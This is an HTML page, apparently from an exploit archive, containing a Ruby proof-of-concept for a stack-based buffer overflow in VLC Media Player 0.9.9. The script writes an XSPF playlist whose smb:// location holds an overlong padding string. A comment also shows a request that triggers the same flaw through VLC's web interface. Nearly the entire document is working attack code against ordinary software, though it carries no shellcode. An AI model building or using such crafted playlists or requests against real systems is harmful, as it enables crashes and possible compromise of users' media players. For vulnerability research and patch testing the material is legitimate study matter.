<html><head><title>VideoLAN VLC Media Player 0.9.9 smb:// URI Stack BOF PoC</title></head><pre>#!/usr/bin/ruby

# VideoLAN VLC Media Player 0.9.9 smb:// URI Stack-based Buffer Overflow (Proof-of-Concept)
#
# Bugtraq ID: 35500
#
# The vulnerability can also be triggered via the VLC web interface (disabled by default):
# http://[vulnerable_ip]:8080/requests/status.xml?command=in_play&amp;input=smb://............
#
# Patch:
# http://git.videolan.org/?p=vlc.git;a=commitdiff;h=e60a9038b13b5eb805a76755efc5c6d5e080180f
#
# Tested on Windows XP SP3 (fully patched), VLC player version 0.9.9 (latest).
#
# Trancer
# http://www.rec-sec.com

foo = &quot;A&quot; * 58
bar = &quot;B&quot; * 4
baz = &quot;C&quot; * 1000

b00m = foo + bar + baz

xspf = %Q|&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;playlist version=&quot;1&quot; xmlns=&quot;http://xspf.org/ns/0/&quot; xmlns:vlc=&quot;http://www.videolan.org/vlc/playlist/ns/0/&quot;&gt;
	&lt;title&gt;Playlist&lt;/title&gt;
	&lt;trackList&gt;
		&lt;track&gt;
			&lt;location&gt;smb://foo.com@www.foo.com/foo/#{b00m}&lt;/location&gt;
			&lt;extension application=&quot;http://www.videolan.org/vlc/playlist/0&quot;&gt;
				&lt;vlc:id&gt;0&lt;/vlc:id&gt;
			&lt;/extension&gt;
		&lt;/track&gt;
	&lt;/trackList&gt;
&lt;/playlist&gt;
|

playlist = File.new(&quot;vlc_smb.xspf&quot;,&quot;wb&quot;)
playlist.write(xspf)
playlist.close

# milw0rm.com [2009-06-29]</pre></html>